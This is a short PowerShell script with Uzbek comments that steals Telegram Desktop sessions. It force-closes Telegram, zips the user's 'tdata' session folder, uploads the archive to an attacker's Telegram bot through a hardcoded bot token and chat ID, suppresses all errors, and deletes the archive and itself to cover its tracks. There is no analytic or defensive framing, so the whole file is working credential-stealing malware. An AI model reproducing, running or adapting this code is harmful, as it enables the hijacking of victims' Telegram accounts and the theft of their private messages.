#!powershell

$TOKEN = "8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo"
$CHAT_ID = "7984884145"
$TDATA_PATH = "$env:APPDATA\Telegram Desktop\tdata"
$ZIP_PATH = "$env:TEMP\tdata_$(Get-Date -Format 'yyyyMMddHHmmss').zip"

# 1. Telegramni o'chirish
taskkill /f /im Telegram.exe > $null 2>&1
Start-Sleep -Seconds 3

# 2. Zip yaratish
try {
    Add-Type -Assembly System.IO.Compression.FileSystem
    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
    [System.IO.Compression.ZipFile]::CreateFromDirectory($TDATA_PATH, $ZIP_PATH, $compressionLevel, $false)
}
catch { exit }

# 3. Telegramga yuborish
try {
    $boundary = [System.Guid]::NewGuid().ToString()
    $fileBytes = [System.IO.File]::ReadAllBytes($ZIP_PATH)
    $fileContent = [System.Convert]::ToBase64String($fileBytes)
    
    $body = @"
--$boundary
Content-Disposition: form-data; name="chat_id"

$CHAT_ID
--$boundary
Content-Disposition: form-data; name="document"; filename="tdata.zip"
Content-Type: application/zip

$fileContent
--$boundary--
"@

    Invoke-RestMethod -Uri "https://api.telegram.org/bot$TOKEN/sendDocument" `
        -Method Post `
        -ContentType "multipart/form-data; boundary=$boundary" `
        -Body $body `
        -TimeoutSec 30 > $null
}
catch { }

# 4. Tozalash
Remove-Item $ZIP_PATH -Force -ErrorAction SilentlyContinue
Remove-Item $MyInvocation.MyCommand.Path -Force
